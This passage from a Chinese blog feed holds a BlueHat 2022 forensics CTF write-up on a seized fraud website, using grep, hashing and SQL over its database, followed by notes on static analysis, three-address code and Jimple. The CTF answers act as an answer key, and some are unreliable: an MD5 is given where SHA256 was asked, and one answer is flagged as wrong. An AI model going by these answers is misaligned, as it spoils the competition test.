class="hljs-string">&#x27;密码不正确&#x27;</span>;<br>    DB::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;loginlogs&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">insert</span>([<br>        [<br>            <span class="hljs-string">&#x27;adminid&#x27;</span> =&gt; <span class="hljs-variable">$Admin</span>-&gt;id,<br>            <span class="hljs-string">&#x27;logintime&#x27;</span> =&gt; <span class="hljs-title class_">Carbon</span>::<span class="hljs-title function_ invoke__">now</span>()-&gt;<span class="hljs-title function_ invoke__">format</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>),<br>            <span class="hljs-string">&#x27;ip&#x27;</span> =&gt; <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getClientIp</span>(),<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&#x27;info&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>        ]<br>    ]);<br></code></pre></td></tr></table></figure><p>然后还是进不去，没办法只能现搜了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f wwwroot]<span class="hljs-comment"># find /www/wwwroot/v9.licai.com/ -name *.php* |xargs grep &#x27;系统版本&#x27;</span><br>/www/wwwroot/v9.licai.com/resources/views/hui/index/main.blade.php:                    &lt;th&gt;系统版本&lt;/th&gt;<br>/www/wwwroot/v9.licai.com/storage/framework/views/1d1554f79bff353b2032169de5c8047eaded358d.php:                    &lt;th&gt;系统 版本&lt;/th&gt;<br>/www/wwwroot/v9.licai.com/storage/framework/views/bfc448ab2762840f72e330e7b7eb820ad28e7b3b.php:                    &lt;th&gt;系统 版本&lt;/th&gt;<br>/www/wwwroot/v9.licai.com/storage/framework/views/c3f4a3dc2c77768579626247d9e8c43360755ece.php:                    &lt;th&gt;系统 版本&lt;/th&gt;<br>[root@yisu-60a2196bb5a4f wwwroot]<span class="hljs-comment"># cat v9.licai.com/resources/views/hui/index/main.blade.php | grep 系统版本 -C 2</span><br>                &lt;tbody&gt;<br>                &lt;<span class="hljs-built_in">tr</span>&gt;<br>                    &lt;th&gt;系统版本&lt;/th&gt;<br>                    &lt;td&gt;1.0.190311&lt;/td&gt;&lt;/tr&gt;<br>                &lt;<span class="hljs-built_in">tr</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="分析涉案网站的会员层级深度，写出最底层会员是多少层。（答案参考格式：66）">分析涉案网站的会员层级深度，写出最底层会员是多少层。（答案参考格式：66）</h3><h3 id="请写出存放网站会员等级变化制度的网站代码文件的SHA256值。（答案参考格式：-8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92）">请写出存放网站会员等级变化制度的网站代码文件的SHA256值。（答案参考格式： 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92）</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f wwwroot]<span class="hljs-comment"># find /www/wwwroot/v9.licai.com/ -name *.php* |xargs grep &#x27;升级&#x27;</span><br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:            充值达到金额升级会员等级<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;您升级为&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;content&quot;</span>=&gt;<span class="hljs-string">&quot;充值升级(&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name.<span class="hljs-string">&quot;)&quot;</span>,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;您升级为&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;content&quot;</span>=&gt;<span class="hljs-string">&quot;充值升级(&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name.<span class="hljs-string">&quot;)&quot;</span>,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                充值达到金额升级会员等级<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                            <span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;您升级为&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                            <span class="hljs-string">&quot;content&quot;</span>=&gt;<span class="hljs-string">&quot;充值升级(&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name.<span class="hljs-string">&quot;)&quot;</span>,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                            <span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;您升级为&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                            <span class="hljs-string">&quot;content&quot;</span>=&gt;<span class="hljs-string">&quot;充值升级(&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name.<span class="hljs-string">&quot;)&quot;</span>,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;您升级为&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name,<br>/www/wwwroot/v9.licai.com/app/Memberrecharge.php:                        <span class="hljs-string">&quot;content&quot;</span>=&gt;<span class="hljs-string">&quot;充值升级(&quot;</span>.<span class="hljs-variable">$levels</span>-&gt;name.<span class="hljs-string">&quot;)&quot;</span>,<br>/www/wwwroot/v9.licai.com/config/web.php:                    <span class="hljs-string">&quot;PromotionRules&quot;</span>=&gt;<span class="hljs-string">&quot;累计投资&quot;</span>,//会员升级规则<br>/www/wwwroot/v9.licai.com/resources/views/film/zcxy.blade.php:                &lt;p&gt;3. 由于黑客攻击、网络供应商技术调整或故障、网站升级、银行方面的问题等原因而造成的本网站服务中断或延迟；&lt;/p&gt;<br>/www/wwwroot/v9.licai.com/resources/views/wap/zcxy.blade.php:                &lt;p&gt;3. 由于黑客攻击、网络供应商技术调整或故障、 网站升级、银行方面的问题等原因而造成的本网站服务中断或延迟；&lt;/p&gt;<br>/www/wwwroot/v9.licai.com/storage/framework/views/9a9305c5486d13bf975282a31e2c609813839171.php:                &lt;p&gt;3. 由于黑 客攻击、网络供应商技术调整或故障、网站升级、银行方面的问题等原因而造成的本网站服务中断或延迟；&lt;/p&gt;<br><br>[root@yisu-60a2196bb5a4f wwwroot]<span class="hljs-comment"># md5sum /www/wwwroot/v9.licai.com/app/Memberrecharge.php</span><br>61afb85d7d147c2b02c5032777d055dd  /www/wwwroot/v9.licai.com/app/Memberrecharge.php<br></code></pre></td></tr></table></figure><h3 id="计算向网站中累计充值最多的五名会员，获得的下线收益总和-不包含平台赠送-。（答案参考格式：666-66）">计算向网站中累计充值最多的五名会员，获得的下线收益总和(不包含平台赠送)。（答案参考格式：666.66）</h3><p>先查看下充值最多的五名会员：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> userid, username, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">AS</span> total_amount <span class="hljs-keyword">FROM</span> memberrecharge <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> userid, username <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912173401568.png" alt="image-20230912173401568"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">sum</span>(moneylog_money) <span class="hljs-keyword">from</span> moneylog <span class="hljs-keyword">where</span> moneylog_type <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%下线%&#x27;</span> <span class="hljs-keyword">and</span> moneylog_userid <span class="hljs-keyword">in</span> (<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">168</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912173630847.png" alt="image-20230912173630847"></p><h3 id="统计涉案网站中余额大于0且银行卡开户行归属于四川省的潜在受害人数量。（答案参考格式：6）">统计涉案网站中余额大于0且银行卡开户行归属于四川省的潜在受害人数量。（答案参考格式：6）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)<br><span class="hljs-keyword">FROM</span> <span class="hljs-keyword">member</span><br><span class="hljs-keyword">WHERE</span> amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> bankaddress <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%四川%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912173820139.png" alt="image-20230912173820139"></p><h3 id="统计平台从成立之初至“2021-07-01-23-59-59”共收益多少金额-不包含平台赠送-。（答案参考格式：6666-66）">统计平台从成立之初至“2021-07-01 23:59:59”共收益多少金额(不包含平台赠送)。（答案参考格式：6666.66）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> b.a<span class="hljs-operator">-</span>d.c  <span class="hljs-keyword">from</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">sum</span>(amount) a <span class="hljs-keyword">FROM</span> `memberrecharge`<span class="hljs-keyword">where</span> type <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;用户充值&#x27;</span> <span class="hljs-keyword">and</span>`status`<span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updated_at <span class="hljs-operator">&lt;</span> <span class="hljs-string">&#x27;2021-07-01 23:59:59&#x27;</span> ) b,(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">sum</span>(amount) c <span class="hljs-keyword">FROM</span> memberwithdrawal <span class="hljs-keyword">where</span>`status` <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updated_at <span class="hljs-operator">&lt;</span> <span class="hljs-string">&#x27;2021-07-01 23:59:59&#x27;</span>) d<br></code></pre></td></tr></table></figure><p><a href="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/old/2022/08/1692487501.png"><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/old/2022/08/1692487501.png" alt="image.png"></a></p><h3 id="统计涉案网站哪一天登录的会员人数最多。（答案参考格式：1999-09-09）">统计涉案网站哪一天登录的会员人数最多。（答案参考格式：1999-09-09）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-type">DATE</span>(logintime) <span class="hljs-keyword">AS</span> login_date, ip, <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> ip) <span class="hljs-keyword">AS</span> login_count <span class="hljs-keyword">FROM</span> loginlogs <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> login_date <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> login_count <span class="hljs-keyword">DESC</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912112344994.png" alt="image-20230912112344994"></p><p><s><em><code>2021-06-16</code></em></s>这个答案应该是不对的，查了下Loginlogs这个表是后台访问的记录。</p><h3 id="写出涉案网站中给客服发送“你好，怎么充值”的用户的fusername值。（答案参考格式：lanmaobei666）">写出涉案网站中给客服发送“你好，怎么充值”的用户的fusername值。（答案参考格式：lanmaobei666）</h3><p>在<code>/root</code>路径下存在<code>mysqldump.sql</code>文件，里面直接搜索可以得到答案<code>hm688</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912153227059.png" alt="image-20230912153227059"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态程序分析学习笔记</title>
    <link href="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <url>/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><blockquote><p>南京大学《软件分析》课程：<a href="https://www.bilibili.com/video/av91858985/?spm_id_from=333.788.video.desc.click">https://www.bilibili.com/video/av91858985/?spm_id_from=333.788.video.desc.click</a></p></blockquote><p>当今编程语言的分类：</p><ul><li>命令式：例如C、JAVA，程序可以按一条条命令拆解下来</li><li>函数式：例如PASCAL、Python（命令式和函数式相结合），将逻辑包含起来，函数也是一种数据类型</li><li>逻辑式：例如SQL、Prolog，代码是逻辑式的，存在判断</li></ul><p><strong>编程语言没有改变很多，但是编程语言所编写的程序变得又大又复杂了。</strong></p><h3 id="我们为什么需要静态分析">我们为什么需要静态分析</h3><p>静态分析可以从程序的<strong>可靠性、安全性、编译优化、程序理解</strong>方面解决下面问题：</p><ul><li><p>可靠性问题</p><p>程序可能存在的内存泄露，空指针等</p></li><li><p>安全性问题</p><p>敏感信息泄露，注入攻击等。</p></li><li><p>编译优化问题</p><p>死代码优化、code motion</p></li><li><p>程序理解</p><p>IDE调用关系逻辑、类型提示等</p></li></ul><h3 id="静态分析是什么">静态分析是什么</h3><p>我想在运行一个程序P之前，就了解P程序所有的行为。</p><ul><li>P存在信息泄露吗？</li><li>P存在空指针引用吗？</li><li>P程序的cast类型是安全的吗？</li><li>P程序V1和V2会指向同一块内存地址吗？</li><li>代码是否是死代码？</li><li>……</li></ul><p>其实，并不存在一个方法能够准确的告诉你这些情况。如果你的程序是由递归可枚举语言（现在主流编程语言）编写的程序，它的<strong>non-trivial property</strong>都是不可判断的。</p><p><code>non-trivial property: interesting properties / the properties related with run-time behaviors of programs.</code></p><p><strong>总而言之：一个完美的，判断程序所有行为的检测方法是不存在的。<strong>一个完美的静态分析方法是满足既</strong>Sound</strong>有<strong>Complete</strong>的结果。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230325165808586.png" alt="image-20230325165808586"></p><p>在上图里，<strong>Truth</strong>表示事实上程序存在的漏洞数，即程序所有可能的行为。Complete和Sound可以简单理解成无误报（<strong>False positives</strong>）有漏报（<strong>False negatives</strong>），有误报无漏报：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230325170303445.png" alt="image-20230325170303445"></p><p>妥协Soundness会带来漏报，妥协Completeness会带来误报。**在真正的程序当中，绝大部分程序都是妥协Completeness。**也就说分析的话，尽可能地Sound（即妥协Completeness）。Soundness对一类的静态分析应用是缺一不可的。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230325172522680.png" alt="image-20230325172522680"></p><p>如上图，如果一个静态分析不是Soundness的话，那在实际分析的过程中，可能只沿着<code>a.fld = b; -&gt; B b' = (B) a.fld;</code>这条路径，从而判断cast语句（强制类型转换）是安全的。但如果是Sound，会判断另一条C的路径，会得出Cast是不安全的结论。</p><p>从下面的伪代码示例，我们可以高屋建瓴地了解静态分析：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 从静态分析的角度，判断X等于？</span><br><span class="hljs-keyword">if</span> (input)<br>x = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>x = <span class="hljs-number">0</span>;<br>-&gt;x= ?<br><br><span class="hljs-comment"># Answer:</span><br><br><span class="hljs-number">1.</span> <span class="hljs-keyword">when</span> input <span class="hljs-keyword">is</span> <span class="hljs-literal">true</span>, x = <span class="hljs-number">1</span><br>   <span class="hljs-keyword">when</span> input <span class="hljs-keyword">is</span> <span class="hljs-literal">false</span>, x = <span class="hljs-number">0</span> √符合complete<br>特点：Sound, precise, expensive<br><br><span class="hljs-number">2.</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x = <span class="hljs-number">0</span> √符合sound<br>特点：Sound, imprecise, cheap<br><br><span class="hljs-number">3.</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x = <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x = <span class="hljs-number">3</span> √符合sound，但存在误报<br><br><span class="hljs-number">4.</span> x = -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x = <span class="hljs-number">0</span> ×不符合sound，因为没有x = <span class="hljs-number">1</span>，存在漏报和误报<br></code></pre></td></tr></table></figure><p>一句话概括静态分析：在保证<strong>Soundness</strong>（无漏报或许有误报）的情况下，在分析的<strong>精度</strong>和<strong>速度</strong>上做一个有效的平衡。</p><h2 id="Intermediate-Representation（中间表示）">Intermediate Representation（中间表示）</h2><h3 id="Complier">Complier</h3><p>编译器会对源码进行<code>词法分析（Scanner）</code>，判断每个单词是否是合理的，如果是合理的，则会对每个单词生成一个tokens，移交<code>语法分析器（Parser）</code>进行分析；tokens的语法符合规则（Context-Free Grammar），会将程序转换成抽象语法树，代码成为一个树的结构；下一步交由<code>类型检查（Type Checker）</code>，判断是否存在类型错误，类型检查的语义通过后，会生成<code>Decorated  AST</code>；如果代码还需要做后续的优化，编译器会通过<code>Translator</code>中间转换器，将DAST转换成中间形式<code>三地址码（IR，Intermediate Representation）</code>，最后交给<code>Code Generator</code>生成机器可执行的代码。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326163615047.png" alt="image-20230326163615047"></p><h3 id="AST-vs-IR">AST vs. IR</h3><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326164355963.png" alt="image-20230326164355963"></p><p>其中最重要的一点是：<strong>不依赖编程语言</strong>的三地址码，通常会作为程序分析过程中，正统的中间表示。</p><p>三地址码包含控制流信息，更利于静态分析。正是这个特性，让三地址码优于抽象语法树，作为静态分析的基础。</p><h3 id="3-Address-Code（3AC）">3-Address Code（3AC）</h3><p>There is at most one operator on the right side of an instruction.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|t1 = a + b</span><br>a + b + <span class="hljs-number">3</span> - &gt;<span class="hljs-string">|</span><br><span class="hljs-string">|t2 = t1 + 3</span><br></code></pre></td></tr></table></figure><p>三地址码转换会引入临时变量，这里就是将<code>a+b</code>的值给t1，然后<code>t1+3</code>给t2。</p><h4 id="为什么叫三地址码？">为什么叫三地址码？</h4><p>这是一种概念上的说法，地址并非传统意义上的地址，按照上面的例子，三地址如下：</p><ol><li>变量名字：a,b</li><li>常量：3</li><li>临时变量：t1,t2</li></ol><p>三地址码整体理解只是一种中间表示形式，转换之后右侧每个式子最多只有一个操作符。</p><h4 id="常见的三地址码形式">常见的三地址码形式</h4><ul><li>x = y <strong>bop</strong> z</li><li>x = <strong>uop</strong> y</li><li>x = y</li><li>goto <strong>L</strong> - 无条件跳转</li><li>if x goto <strong>L</strong> - 有条件跳转</li><li>if x <strong>rop</strong> y goto <strong>L</strong></li></ul><blockquote><p>x, y, z：地址</p><p>bop：二元操作符，可以是运算符，比如加减运算，或是逻辑运算（与或非）</p><p>uop：一元操作符，unary opertaion(minus, negation, casting)，负值，取反，类型转换</p><p>L：代表一个程序/函数的地址</p><p>rop：关系操作符，大于、小于、等于等等</p></blockquote><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326165734947.png" alt="image-20230326165734947"></p><h3 id="Soot-and-Its-IR：Jimple">Soot and Its IR：Jimple</h3><p>Jimple是Soot静态分析器的三地址码，以下面的几段代码为示例，简单分析Soot实际分析过程中所产生的三地址码。</p><p>For循环：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* For LOOP JAVA Source code*/</span><br><span class="hljs-keyword">package</span> nju.sa.examples;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ForLoop3AC</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>x = x + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* 3AC (jimple) */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>&#123;<br>    java.lang.String[] r0; <br>    <span class="hljs-type">int</span> i1; <br>    r0 := <span class="hljs-meta">@parameter0</span>: java.lang.String[]; <span class="hljs-comment">// r0即传参后的值</span><br>    i1 = <span class="hljs-number">0</span>; <span class="hljs-comment">// for循环的i</span><br> <br>    <span class="hljs-comment">//这里x是不应该被优化掉的，可能是前端的一些选项导致了x被优化</span><br>    <br>    lable1:<br>    <span class="hljs-keyword">if</span> i1 &gt;= <span class="hljs-number">10</span> goto label2; <span class="hljs-comment">//不满足循环条件跳出循环</span><br>    i1 = i1 + <span class="hljs-number">1</span>;<br>    goto label1; <span class="hljs-comment">//直到i1&gt;=10，否则一直在循环</span><br>   <br>    label2:<br>    retrun;   <br>&#125;<br></code></pre></td></tr></table></figure><p>Do-While：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* Do-While JAVA Source code*/</span><br><span class="hljs-keyword">package</span> nju.sa.examples;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoWhile3AC</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span>&#123;<br>            i = i + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">while</span>(arr[i] &lt; <span class="hljs-number">10</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* 3AC (jimple) */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>&#123;<br>    java.lang.String[] r0; <br>    <span class="hljs-type">int</span>[] r1;<br>    <span class="hljs-type">int</span> $i0, i1;<br>    <br>    <span class="hljs-comment">//$i0只是临时变量的意思，等同于_i0或i0</span><br>    <br>    r0 := <span class="hljs-meta">@parameter0</span>: java.lang.String[]; <span class="hljs-comment">// r0即传参后的值</span><br>    r1 = newarry (<span class="hljs-type">int</span>)[<span class="hljs-number">10</span>]<br>    i1 = <span class="hljs-number">0</span>; <br> <br>    lable1:<br>    i1 = i1 + <span class="hljs-number">1</span>;<br>    $i0 = r1[i1]<br><span class="hljs-keyword">if</span> $i0 &lt; <span class="hljs-number">10</span> goto label1;<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Call：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* Method Call JAVA Source code*/</span><br><span class="hljs-keyword">package</span> nju.sa.examples;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodCall3AC</span> &#123;<br><br>    String <span class="hljs-title function_">foo</span><span class="hljs-params">(String para1, String para2)</span>&#123;<br>        <span class="hljs-keyword">return</span> para1 + <span class="hljs-string">&quot; &quot;</span> + para2;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">MethodCall3AC</span> <span class="hljs-variable">mc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 